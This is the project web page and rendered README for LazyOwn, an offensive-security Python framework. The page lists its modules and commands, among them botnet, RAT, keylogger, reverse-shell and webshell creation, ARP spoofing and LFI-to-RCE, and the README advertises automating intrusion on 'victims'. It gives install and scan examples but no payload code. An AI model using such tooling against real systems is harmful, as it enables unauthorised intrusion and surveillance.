<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LazyOwn Framework | Pentesting Automation Tool</title>
    <meta name="description" content="Discover LazyOwn Framework, a powerful Python tool for pentesting, vulnerability analysis, and automation. Learn about its features, installation, and usage.">
    <meta name="keywords" content="LazyOwn Framework, pentesting, vulnerability analysis, Python tool, cybersecurity, automation">

    <!-- Etiquetas Open Graph (OG) -->
    <meta property="og:title" content="LazyOwn Framework | Pentesting Automation Tool">
    <meta property="og:description" content="Discover LazyOwn Framework, a powerful Python tool for pentesting, vulnerability analysis, and automation. Learn about its features, installation, and usage.">
    <meta property="og:url" content="https://grisuno.github.io/LazyOwn/">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://preview.redd.it/lazyown-impacket-smbserver-command-v0-sropq5uty88d1.png?width=640&crop=smart&auto=webp&s=78f58048249469d78e943de18134ce05b6df6d24">
    <meta property="og:image:secure_url" content="https://www.reddit.com/media?url=https%3A%2F%2Fpreview.redd.it%2Flazyown-impacket-smbserver-command-v0-sropq5uty88d1.png%3Fwidth%3D640%26crop%3Dsmart%26auto%3Dwebp%26s%3D78f58048249469d78e943de18134ce05b6df6d24">
    <meta property="og:image:alt" content="LazyOwn Framework Logo">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="LazyOwn Framework | Pentesting Automation Tool">
    <meta name="twitter:description" content="Discover LazyOwn Framework, a powerful Python tool for pentesting, vulnerability analysis, and automation. Learn about its features, installation, and usage.">
    <meta name="twitter:image" content="https://www.example.com/twitter-card-image.jpg">

    <!-- Otros meta tags -->
    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
    <style>
        html {
            background-color: #000; /* Fondo negro */
            color: #00ff00; /* Color del texto verde neón */
            font-family: 'VT323', monospace; /* Fuente monospace */
            margin: 0;
            padding: 0;
            height: 95vh; /* Altura del 95% de la ventana del navegador */
            overflow: auto; /* Permite el desplazamiento si es necesario */
        }
        .container {
            width: 100%;
            margin: 0 auto;
            padding: 20px;
            background-color: #111; /* Fondo del contenedor */
            border-radius: 10px;
            box-shadow: 0 0 10px #00ff00;
        }        
        body {
            background-color: #000 !important;
            
            color: #00ff00;
            font-family: 'VT323', monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: 0 auto;
            padding: 20px;
        }
        h1, h2, h3, p {
            margin: 0 0 20px 0;
        }
        a {
            color: #00ff00;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .banner {
            text-align: center;
            margin-bottom: 40px;
        }
        .content {
            background-color: #111;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px #00ff00;
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 10px;
            background-color: #111;
            border-top: 1px solid #00ff00;
        }
        .neon-text {
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #00ff00;
            animation: flicker 1.5s infinite alternate;
        }
        /* Aplica a todas las imágenes dentro de un contenedor */
        img {
            max-width: 100%;    /* Las imágenes no serán más anchas que el contenedor */
            height: auto;       /* Mantiene la proporción original de la imagen */
            display: block;     /* Elimina el espacio blanco debajo de la imagen */
            margin: 0 auto;     /* Centra la imagen horizontalmente en el contenedor */
        }

        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
                opacity: 1;
            }
            20%, 24%, 55% {
                opacity: 0.5;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="banner">
            <h1 class="neon-text">LazyOwn Framework [;,;]</h1>
        </div>
        <div class="content">
            <h2>About</h2>
            <p><a href="https://github.com/grisuno/LazyOwn" class="neon-text"> LazyOwn Framework </a> [;,;] is a powerful tool written in Python designed to simplify and automate pentesting and vulnerability analysis tasks. This framework offers a wide range of features, from real-time packet capture and analysis to the execution of various pentesting techniques such as fuzzing, deployment of webshells, creation of botnets, implementation of trojans (Rat), keylogging, port scanning with Nmap, and more.

The interactive terminal interface provided by LazyOwn makes it easy to configure and execute these functions, providing users with an intuitive and powerful environment for conducting security tests. Additionally, LazyOwn offers the ability to save captured packets to a file for later analysis, facilitating research and incident tracking.

Installation of LazyOwn is straightforward, simply by cloning the repository from GitHub and then installing the required dependencies via pip. Once installed, users can start the framework by running the python app.py command from the command line.

For any questions or comments, users can contact the developer, Gris Iscomeback, through the channels provided on the official LazyOwn Framework website.

In summary, LazyOwn Framework is a comprehensive tool that offers a centralized and automated solution for pentesting and vulnerability analysis needs, enabling cybersecurity professionals to conduct security tests efficiently and effectively.</p>
            <h2>Features</h2>
            <pre class="neon-text">
                <small><small><small><small><small>
                ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
                ▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
                ▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
                ▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
                ░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
                ░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
                ░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
                  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
                    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
                                 ░         ░ ░                                                
                  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
                ▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
                ▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
                ░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
                ░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
                 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
                 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
                 ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
                          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
                                                                                              
                </small></small></small></small></small>
            </pre>
            <ul>
                <li><a href="COMMANDS.html">COMMANDS.html</a></li>
                <li><a href="UTILS.html">UTILS.html</a></li>
                <li><a href="CHANGELOG.html">CHANGELOG.html</a></li>
                <li>Real-time packet capture</li>
                <li>Detailed packet analysis</li>
                <li>Interactive terminal interface</li>
                <li>Save captured packets to a file</li>
                <li>Fuzzing</li>
                <li>Webshellz</li>
                <li>BotNet</li>
                <li>Rat</li>
                <li>Keylogger</li>
                <li>Nmap</li>
                <li>Pwn</li>
            </ul>
            <h3> Modules </h3>
            <ul>
                <li>lazysearch</li>
                <li>lazysearch_gui</li>
                <li>lazyown</li>
                <li>update_db</li>
                <li>lazynmap</li>
                <li>lazynmapdiscovery</li>
                <li>lazygptcli</li>
                <li>lazyburpfuzzer</li>
                <li>lazymetaextract0r</li>
                <li>lazyreverse_shell</li>
                <li>lazyattack</li>
                <li>lazyownratcli</li>
                <li>lazyownrat</li>
                <li>lazygath</li>
                <li>lazysniff</li>
                <li>lazynetbios</li>
                <li>lazybotnet</li>
                <li>lazybotcli</li>
                <li>lazyhoneypot</li>
                <li>lazysearch_bot</li>
            </ul>
            <h2>Installation</h2>
            <p>To get started with LazyOwn Framework, clone the repository and install the dependencies:</p>
            <pre><code class="neon-text">git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
pip install -r requirements.txt</code></pre>
            <h2>Usage</h2>
            <p>Run the  Framework with the following command:</p>
            <pre><code class="neon-text">python app.py </code></pre>
            <p>Para codificar y decodificar payloads con esta app web, sí se te dificulta el uso de test_lazyencode_decode.py</p>
            <a href="https://lazyownencoderdecoder.onrender.com/" class="neon-text"> https://lazyownencoderdecoder.onrender.com/ </a>
            <h2>Contact</h2>
            <p>For any questions or feedback, please reach out to <a href="mailto:grisiscomeback[at]gmail[dot]com">Gris Iscomeback</a>.</p>
<!-- contenido anterior -->

<!-- START README -->
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>README</title>
  <style>
    html {
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 12px;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      html {
        background-color: white;
      }
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    svg {
      height: auto;
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
      font-size: 85%;
      margin: 0;
      hyphens: manual;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
    /* CSS for syntax highlighting */
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { color: #008000; } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { color: #008000; font-weight: bold; } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
</head>
<body>
<h1 id="lazyown">LazyOwn</h1>
<p><img
src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&amp;logo=python&amp;logoColor=ffdd54"
alt="Python" /> <img
src="https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&amp;logo=gnu-bash&amp;logoColor=white"
alt="Shell Script" /> <img
src="https://github.com/user-attachments/assets/961783c2-cd57-4cc2-ab4c-53fde581db79"
alt="image" /> <img
src="https://github.com/user-attachments/assets/79052f87-f87c-4b32-a4a2-854113ca3a4c"
alt="image" /> <a href="https://www.gnu.org/licenses/gpl-3.0"><img
src="https://img.shields.io/badge/License-GPLv3-blue.svg"
alt="License: GPL v3" /></a> <img
src="https://github.com/user-attachments/assets/b69f1d31-c075-4713-a44e-a40a034a7407"
alt="image" /> <img
src="https://github.com/user-attachments/assets/df82a669-be0c-4a03-bd98-842a67baaef6"
alt="image" /></p>
<figure>
<img
src="https://github.com/user-attachments/assets/73097914-3af9-4b8f-8824-ed599dfc7e38"
alt="lazyown" />
<figcaption aria-hidden="true">lazyown</figcaption>
</figure>
<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">██╗</span>      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">██║</span>     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">██║</span>     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">██║</span>     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">███████╗██║</span>  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">╚══════╝╚═╝</span>  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝</span></code></pre></div>
<p><a href="https://ko-fi.com/Y8Y2Z73AV"><img
src="https://ko-fi.com/img/githubbutton_sm.svg" alt="ko-fi" /></a></p>
<figure>
<img
src="https://github.com/user-attachments/assets/1debaed0-8f84-4079-ad2f-48cc4cfd9d95"
alt="LazyOwn1" />
<figcaption aria-hidden="true">LazyOwn1</figcaption>
</figure>
<p>LazyOwn Framework is a powerful and versatile security framework
designed to automate and streamline pentesting and vulnerability
analysis tasks. This interactive environment combines multiple tools and
scripts, making it easier for cybersecurity professionals to work
through various stages of the security assessment lifecycle. With an
intuitive command-line interface, LazyOwn allows users to configure
specific parameters, execute custom scripts, and obtain real-time
results, all from a single platform.</p>
<p>Key Features:</p>
<p>Interactive Interface:</p>
<p>Interactive shell with user-friendly commands for configuring and
running scripts. Ability to display and adjust custom parameters
applicable to different scripts. Task Automation:</p>
<p>Automates common pentesting tasks such as vulnerability scanning, web
application fuzzing, brute force attacks, and more. Integration with
popular tools and custom scripts for comprehensive testing coverage on
Parrot Sec. Real-Time Visualization:</p>
<p>Real-time output display of script execution, allowing users to see
results instantly and react swiftly. Modularity and Extensibility:</p>
<p>Designed to be extensible, enabling users to easily add and customize
scripts. Supports multiple scripting languages, including Python and
Bash. Flexible Configuration:</p>
<p>Ability to set specific parameters like IP addresses, API keys, HTTP
methods, request data, and more, providing complete control over
executed scripts. Typical Use:</p>
<p>Parameter Configuration:</p>
<p>Users can set required parameters using commands like set target_ip
192.168.1.1 to define the target IP address. Script Execution:</p>
<p>Execute predefined scripts for various tasks, such as run lazygptcli
to interact with GPT using a configured prompt and API key. Results
Visualization:</p>
<p>Script results are displayed in the console in real-time, providing
immediate feedback on progress and findings. Additional Modules:</p>
<p>LazyOwn includes various specialized modules such as:</p>
<p>lazyownrat and lazyownratcli: For running remote access tools with
configurable parameters. lazyftpsniff and lazysniff: For network
sniffing on specified interfaces. lazysearch_bot and lazygptcli: For
interacting with search APIs and GPT-based tools. lazyhoneypot: For
setting up email-based honeypots. lazynetbios: For NetBIOS enumeration
across IP ranges. lazywerkzeugdebug: For testing Werkzeug in debug mode.
Background:</p>
<p>Originally designed to automate the search and analysis of binaries
with special permissions on Linux and Windows systems, LazyOwn has
evolved to encompass a broader range of functionalities. The project
includes scripts that extract information from GTFOBins, analyze
binaries on the system, and generate options based on the collected
data.</p>
<p>LazyOwn on Reddit</p>
<p>Revolutionize Your Pentesting with LazyOwn: Automate the intrusion on
Linux, MAC OSX, and Windows VICTIMS</p>
<p><a href="https://www.reddit.com/r/LazyOwn/"
class="uri">https://www.reddit.com/r/LazyOwn/</a></p>
<p><a
href="https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a"
class="uri">https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a</a></p>
<p>Discover LazyOwn, the ultimate solution for automating the pentesting
workflow to attack Linux, MacOSX and Windows systems. Our powerful tool
simplifies pentesting, making it more efficient and effective. Watch
this video to learn how LazyOwn can streamline your security assessments
and enhance your cybersecurity toolkit.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set target_ip 192.168.1.1</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[SET]</span> target_ip set to 192.168.1.1</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazynmap</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> Running Nmap scan on 192.168.1.1</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<p>LazyOwn es ideal para profesionales de la ciberseguridad que buscan
una solución centralizada y automatizada para sus necesidades de
pentesting, ahorrando tiempo y mejorando la eficiencia en la
identificación y explotación de vulnerabilidades.</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d"
alt="Captura de pantalla 2024-05-22 021136" />
<figcaption aria-hidden="true">Captura de pantalla 2024-05-22
021136</figcaption>
</figure>
<h2 id="requisitos">Requisitos</h2>
<ul>
<li>Python 3.x</li>
<li>Módulos de Python:
<ul>
<li>python-libnmap</li>
<li>pwn</li>
<li>groq</li>
<li>PyPDF2</li>
<li>docx</li>
<li>python-docx</li>
<li>olefile</li>
<li>exifread</li>
<li>pycryptodome</li>
<li>impacket</li>
<li>pandas</li>
<li>colorama</li>
<li>tabulate</li>
<li>pyarrow</li>
<li>keyboard</li>
<li>flask-unsign</li>
<li>name-that-hash</li>
</ul></li>
<li><code>subprocess</code> (incluido en la biblioteca estándar de
Python)</li>
<li><code>platform</code> (incluido en la biblioteca estándar de
Python)</li>
<li><code>tkinter</code> (Opcional para el GUI)</li>
<li><code>numpy</code> (Opcional para el GUI)</li>
<li></li>
</ul>
<h2 id="instalación">Instalación</h2>
<ol type="1">
<li>Clona el repositorio:</li>
</ol>
<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/grisuno/LazyOwn.git</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> LazyOwn</span></code></pre></div>
<ol start="2" type="1">
<li>Instala las dependencias de Python:</li>
</ol>
<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./install.sh</span></span></code></pre></div>
<h2 id="uso">Uso</h2>
<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./run</span> or ./fast_run_as_r00t.sh </span></code></pre></div>
<pre><code>Use set &lt;parameter&gt; &lt;value&gt; to set parameters.
Use show to display current parameter values.
Use run &lt;script_name&gt; to execute a script with the set parameters.
Use exit to exit the CLI.
Una vez que el shell esté en funcionamiento, puedes utilizar los siguientes comandos:

list: Lista todos los Modulos de LazyOwn
set &lt;parámetro&gt; &lt;valor&gt;: Establece el valor de un parámetro. Por ejemplo, set target_ip 192.168.1.1.
show: Muestra los valores actuales de todos los parámetros.
run &lt;script&gt;: Ejecuta un script específico disponible en el framework.
Scripts disponibles

LazyOwn&gt; ls
    [+] Available scripts to run: [👽]
lazysearch                lazysearch_gui            lazyown
update_db                 lazynmap                  lazyaslrcheck
lazynmapdiscovery         lazygptcli                lazyburpfuzzer
lazymetaextract0r         lazyreverse_shell         lazyattack
lazyownratcli             lazyownrat                lazygath
lazysniff                 lazynetbios               lazybotnet
lazybotcli                lazyhoneypot              lazysearch_bot
lazylfi2rce               lazylogpoisoning          lazymsfvenom
lazypathhijacking         lazyarpspoofing           lazyftpsniff
lazyssh77enum             lazywerkzeugdebug
LazyOwn&gt; ?

Documented commands (type help &lt;topic&gt;):
========================================
acknowledgearp     dirsearch           lazywebshell     rpcdump
acknowledgeicmp    dnsenum             ldapdomaindump   rubeus
addhosts           dnsmap              list             run
alias              download_exploit    msf              samrdump
arpscan            download_resources  nbtscan          set
asprevbase64       encrypt             nc               sh
banner             enum4linux          nikto            show
bloodhound         exit                nmapscripthelp   smbclient
chisel             fixel               openssl_sclient  smbmap
clean              fixperm             payload          smbserver
clock              getcap              ping             snmpcheck
cme                getnpusers          ports            socat
conptyshell        getseclist          proxy            sqlmap
cp                 gobuster            psexec           ss
cports             gospider            pwd              sshd
createcredentials  hashcat             py3ttyup         tcpdump_icmp
createhash         help                pyautomate       vpn
createrevshell     ignorearp           qa               wfuzz
createwebshell     ignoreicmp          responder        whatweb
createwinrevshell  ip                  rev              winbase64payload
decrypt            john2hash           rhost            wrapper
dig                lazypwn             rpcclient        www


</code></pre>
<h2 id="tag-en-youtube">Tag en youtube</h2>
<p><a href="https://www.youtube.com/hashtag/lazyown"
class="uri">https://www.youtube.com/hashtag/lazyown</a></p>
<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set binary_name my_binary</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set target_ip 192.168.1.100</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set api_key my_api_key</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazysearch</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazynmap</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> exit</span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<p>para las busquedas</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazysearch.py binario_a_buscar</span></code></pre></div>
<h2 id="busquedas-con-gui">Busquedas con GUI</h2>
<p>Características adicionales y cambios: AutocompleteEntry:</p>
<p>Se ha agregado un filtro para eliminar valores None de la lista de
autocompletar. Nuevo Vector de Ataque:</p>
<p>Añadido un botón “Nuevo Vector de Ataque” en la interfaz principal.
Implementada la funcionalidad para agregar un nuevo vector de ataque y
guardar los datos actualizados en los archivos Parquet. Exportar a
CSV:</p>
<p>Añadido un botón “Exportar a CSV” en la interfaz principal.
Implementada la funcionalidad para exportar los datos del DataFrame a un
archivo CSV seleccionado por el usuario. Uso: Agregar un nuevo vector de
ataque: Hacer clic en el botón “Nuevo Vector de Ataque”, llenar los
campos y guardar. Exportar a CSV: Hacer clic en el botón “Exportar a
CSV” y seleccionar la ubicación para guardar el archivo CSV.</p>
<p>Nueva Función scan_system_for_binaries:</p>
<p>Implementa la búsqueda de binarios en el sistema utilizando el
comando file para determinar si un archivo es binario. Se utiliza
os.walk para recorrer el sistema de archivos. Los resultados se muestran
en una nueva ventana de la GUI. Botón para Buscar Binarios:</p>
<p>Se ha añadido un botón “Buscar Binarios en el Sistema” en la interfaz
principal que llama a la función scan_system_for_binaries. Nota: La
función is_binary utiliza el comando file de Unix para determinar si un
archivo es un ejecutable binario. Si estás en un sistema operativo
diferente, necesitarás ajustar este método para que sea compatible. Esta
implementación puede ser intensiva en recursos, ya que recorre todo el
sistema de archivos. Podrías añadir opciones adicionales para limitar la
búsqueda a directorios específicos o añadir un filtro para ciertos tipos
de archivos.</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> LazyOwnExplorer.py</span></code></pre></div>
<figure>
<img
